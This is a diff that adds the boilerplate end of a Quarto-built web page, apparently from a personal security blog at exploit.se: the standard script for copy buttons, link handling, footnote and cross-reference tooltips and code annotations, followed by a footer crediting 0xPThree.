+  window.document.addEventListener("DOMContentLoaded", function (event) {
+    const icon = "";
+    const anchorJS = new window.AnchorJS();
+    anchorJS.options = {
+      placement: 'right',
+      icon: icon
+    };
+    anchorJS.add('.anchored');
+    const isCodeAnnotation = (el) => {
+      for (const clz of el.classList) {
+        if (clz.startsWith('code-annotation-')) {                     
+          return true;
+        }
+      }
+      return false;
+    }
+    const onCopySuccess = function(e) {
+      // button target
+      const button = e.trigger;
+      // don't keep focus
+      button.blur();
+      // flash "checked"
+      button.classList.add('code-copy-button-checked');
+      var currentTitle = button.getAttribute("title");
+      button.setAttribute("title", "Copied!");
+      let tooltip;
+      if (window.bootstrap) {
+        button.setAttribute("data-bs-toggle", "tooltip");
+        button.setAttribute("data-bs-placement", "left");
+        button.setAttribute("data-bs-title", "Copied!");
+        tooltip = new bootstrap.Tooltip(button, 
+          { trigger: "manual", 
+            customClass: "code-copy-button-tooltip",
+            offset: [0, -8]});
+        tooltip.show();    
+      }
+      setTimeout(function() {
+        if (tooltip) {
+          tooltip.hide();
+          button.removeAttribute("data-bs-title");
+          button.removeAttribute("data-bs-toggle");
+          button.removeAttribute("data-bs-placement");
+        }
+        button.setAttribute("title", currentTitle);
+        button.classList.remove('code-copy-button-checked');
+      }, 1000);
+      // clear code selection
+      e.clearSelection();
+    }
+    const getTextToCopy = function(trigger) {
+        const codeEl = trigger.previousElementSibling.cloneNode(true);
+        for (const childEl of codeEl.children) {
+          if (isCodeAnnotation(childEl)) {
+            childEl.remove();
+          }
+        }
+        return codeEl.innerText;
+    }
+    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+      text: getTextToCopy
+    });
+    clipboard.on('success', onCopySuccess);
+    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+        text: getTextToCopy,
+        container: window.document.getElementById('quarto-embedded-source-code-modal')
+      });
+      clipboardModal.on('success', onCopySuccess);
+    }
+      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+      var mailtoRegex = new RegExp(/^mailto:/);
+        var filterRegex = new RegExp("https:\/\/exploit\.se");
+      var isInternal = (href) => {
+          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+      }
+      // Inspect non-navigation links and adorn them if external
+     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+      for (var i=0; i<links.length; i++) {
+        const link = links[i];
+        if (!isInternal(link.href)) {
+          // undo the damage that might have been done by quarto-nav.js in the case of
+          // links that we want to consider external
+          if (link.dataset.originalHref !== undefined) {
+            link.href = link.dataset.originalHref;
+          }
+        }
+      }
+    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+      const config = {
+        allowHTML: true,
+        maxWidth: 500,
+        delay: 100,
+        arrow: false,
+        appendTo: function(el) {
+            return el.parentElement;
+        },
+        interactive: true,
+        interactiveBorder: 10,
+        theme: 'quarto',
+        placement: 'bottom-start',
+      };
+      if (contentFn) {
+        config.content = contentFn;
+      }
+      if (onTriggerFn) {
+        config.onTrigger = onTriggerFn;
+      }
+      if (onUntriggerFn) {
+        config.onUntrigger = onUntriggerFn;
+      }
+      window.tippy(el, config); 
+    }
+    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+    for (var i=0; i<noterefs.length; i++) {
+      const ref = noterefs[i];
+      tippyHover(ref, function() {
+        // use id or data attribute instead here
+        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+        try { href = new URL(href).hash; } catch {}
+        const id = href.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note) {
+          return note.innerHTML;
+        } else {
+          return "";
+        }
+      });
+    }
+    const xrefs = window.document.querySelectorAll('a.quarto-xref');
+    const processXRef = (id, note) => {
+      // Strip column container classes
+      const stripColumnClz = (el) => {
+        el.classList.remove("page-full", "page-columns");
+        if (el.children) {
+          for (const child of el.children) {
+            stripColumnClz(child);
+          }
+        }
+      }
+      stripColumnClz(note)
+      if (id === null || id.startsWith('sec-')) {
+        // Special case sections, only their first couple elements
+        const container = document.createElement("div");
+        if (note.children && note.children.length > 2) {
+          container.appendChild(note.children[0].cloneNode(true));
+          for (let i = 1; i < note.children.length; i++) {
+            const child = note.children[i];
+            if (child.tagName === "P" && child.innerText === "") {
+              continue;
+            } else {
+              container.appendChild(child.cloneNode(true));
+              break;
+            }
+          }
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(container);
+          }
+          return container.innerHTML
+        } else {
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(note);
+          }
+          return note.innerHTML;
+        }
+      } else {
+        // Remove any anchor links if they are present
+        const anchorLink = note.querySelector('a.anchorjs-link');
+        if (anchorLink) {
+          anchorLink.remove();
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        if (note.classList.contains("callout")) {
+          return note.outerHTML;
+        } else {
+          return note.innerHTML;
+        }
+      }
+    }
+    for (var i=0; i<xrefs.length; i++) {
+      const xref = xrefs[i];
+      tippyHover(xref, undefined, function(instance) {
+        instance.disable();
+        let url = xref.getAttribute('href');
+        let hash = undefined; 
+        if (url.startsWith('#')) {
+          hash = url;
+        } else {
+          try { hash = new URL(url).hash; } catch {}
+        }
+        if (hash) {
+          const id = hash.replace(/^#\/?/, "");
+          const note = window.document.getElementById(id);
+          if (note !== null) {
+            try {
+              const html = processXRef(id, note.cloneNode(true));
+              instance.setContent(html);
+            } finally {
+              instance.enable();
+              instance.show();
+            }
+          } else {
+            // See if we can fetch this
+            fetch(url.split('#')[0])
+            .then(res => res.text())
+            .then(html => {
+              const parser = new DOMParser();
+              const htmlDoc = parser.parseFromString(html, "text/html");
+              const note = htmlDoc.getElementById(id);
+              if (note !== null) {
+                const html = processXRef(id, note);
+                instance.setContent(html);
+              } 
+            }).finally(() => {
+              instance.enable();
+              instance.show();
+            });
+          }
+        } else {
+          // See if we can fetch a full url (with no hash to target)
+          // This is a special case and we should probably do some content thinning / targeting
+          fetch(url)
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.querySelector('main.content');
+            if (note !== null) {
+              // This should only happen for chapter cross references
+              // (since there is no id in the URL)
+              // remove the first header
+              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+                note.children[0].remove();
+              }
+              const html = processXRef(null, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      }, function(instance) {
+      });
+    }
+        let selectedAnnoteEl;
+        const selectorForAnnotation = ( cell, annotation) => {
+          let cellAttr = 'data-code-cell="' + cell + '"';
+          let lineAttr = 'data-code-annotation="' +  annotation + '"';
+          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+          return selector;
+        }
+        const selectCodeLines = (annoteEl) => {
+          const doc = window.document;
+          const targetCell = annoteEl.getAttribute("data-target-cell");
+          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+          const lineIds = lines.map((line) => {
+            return targetCell + "-" + line;
+          })
+          let top = null;
+          let height = null;
+          let parent = null;
+          if (lineIds.length > 0) {
+              //compute the position of the single el (top and bottom and make a div)
+              const el = window.document.getElementById(lineIds[0]);
+              top = el.offsetTop;
+              height = el.offsetHeight;
+              parent = el.parentElement.parentElement;
+            if (lineIds.length > 1) {
+              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+              height = bottom - top;
+            }
+            if (top !== null && height !== null && parent !== null) {
+              // cook up a div (if necessary) and position it 
+              let div = window.document.getElementById("code-annotation-line-highlight");
+              if (div === null) {
+                div = window.document.createElement("div");
+                div.setAttribute("id", "code-annotation-line-highlight");
+                div.style.position = 'absolute';
+                parent.appendChild(div);
+              }
+              div.style.top = top - 2 + "px";
+              div.style.height = height + 4 + "px";
+              div.style.left = 0;
+              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+              if (gutterDiv === null) {
+                gutterDiv = window.document.createElement("div");
+                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+                gutterDiv.style.position = 'absolute';
+                const codeCell = window.document.getElementById(targetCell);
+                const gutter = codeCell.querySelector('.code-annotation-gutter');
+                gutter.appendChild(gutterDiv);
+              }
+              gutterDiv.style.top = top - 2 + "px";
+              gutterDiv.style.height = height + 4 + "px";
+            }
+            selectedAnnoteEl = annoteEl;
+          }
+        };
+        const unselectCodeLines = () => {
+          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+          elementsIds.forEach((elId) => {
+            const div = window.document.getElementById(elId);
+            if (div) {
+              div.remove();
+            }
+          });
+          selectedAnnoteEl = undefined;
+        };
+          // Handle positioning of the toggle
+      window.addEventListener(
+        "resize",
+        throttle(() => {
+          elRect = undefined;
+          if (selectedAnnoteEl) {
+            selectCodeLines(selectedAnnoteEl);
+          }
+        }, 10)
+      );
+      function throttle(fn, ms) {
+      let throttle = false;
+      let timer;
+        return (...args) => {
+          if(!throttle) { // first call gets through
+              fn.apply(this, args);
+              throttle = true;
+          } else { // all the others get throttled
+              if(timer) clearTimeout(timer); // cancel #2
+              timer = setTimeout(() => {
+                fn.apply(this, args);
+                timer = throttle = false;
+              }, ms);
+          }
+        };
+      }
+        // Attach click handler to the DT
+        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+        for (const annoteDlNode of annoteDls) {
+          annoteDlNode.addEventListener('click', (event) => {
+            const clickedEl = event.target;
+            if (clickedEl !== selectedAnnoteEl) {
+              unselectCodeLines();
+              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+              if (activeEl) {
+                activeEl.classList.remove('code-annotation-active');
+              }
+              selectCodeLines(clickedEl);
+              clickedEl.classList.add('code-annotation-active');
+            } else {
+              // Unselect the line
+              unselectCodeLines();
+              clickedEl.classList.remove('code-annotation-active');
+            }
+          });
+        }
+    const findCites = (el) => {
+      const parentEl = el.parentElement;
+      if (parentEl) {
+        const cites = parentEl.dataset.cites;
+        if (cites) {
+          return {
+            el,
+            cites: cites.split(' ')
+          };
+        } else {
+          return findCites(el.parentElement)
+        }
+      } else {
+        return undefined;
+      }
+    };
+    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+    for (var i=0; i<bibliorefs.length; i++) {
+      const ref = bibliorefs[i];
+      const citeInfo = findCites(ref);
+      if (citeInfo) {
+        tippyHover(citeInfo.el, function() {
+          var popup = window.document.createElement('div');
+          citeInfo.cites.forEach(function(cite) {
+            var citeDiv = window.document.createElement('div');
+            citeDiv.classList.add('hanging-indent');
+            citeDiv.classList.add('csl-entry');
+            var biblioDiv = window.document.getElementById('ref-' + cite);
+            if (biblioDiv) {
+              citeDiv.innerHTML = biblioDiv.innerHTML;
+            }
+            popup.appendChild(citeDiv);
+          });
+          return popup.innerHTML;
+        });
+      }
+    }
+  });
+  </script>
+</div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item">
+ © 2025 0xPThree - All Rights Reserved.
+  </li>  
+</ul>
+    </div>
+    <div class="nav-footer-right">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
+      <i class="bi bi-signal" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/0xpthree">
+      <i class="bi bi-github" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="../../index.xml">
+      <i class="bi bi-rss" role="img">
+</i> 
+    </a>
+  </li>  
+</ul>
+    </div>
+  </div>
+</footer>
+
+
+
+
+</body></html>
